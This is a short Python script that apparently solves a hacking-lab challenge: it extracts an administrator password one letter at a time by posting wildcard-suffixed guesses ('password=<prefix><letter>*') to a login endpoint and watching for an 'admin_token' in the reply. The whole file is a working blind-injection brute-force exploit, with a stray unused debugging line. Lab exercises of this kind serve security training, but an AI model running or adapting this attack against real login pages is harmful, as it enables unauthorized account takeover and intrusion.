import requests
import string

host = "e4ec6e1b-ce79-4c8c-a76d-8f7e2e480e5b.idocker.vuln.land"
password = ""
while True:
    for c in string.ascii_lowercase:
        print(f"\r{password}{c}", end="")
        while True:
            resp = requests.post(f"https://{host}/login",
                    data=f"password={password}{c}*")
            if resp.status_code == 200:
                break
        if c == "s":
            x = 1
        if "admin_token" in resp.text:
            password += c
            break
    resp = requests.post(f"https://{host}/login", data=f"password={password}")
    if "admin_token" in resp.text:
        print()
        break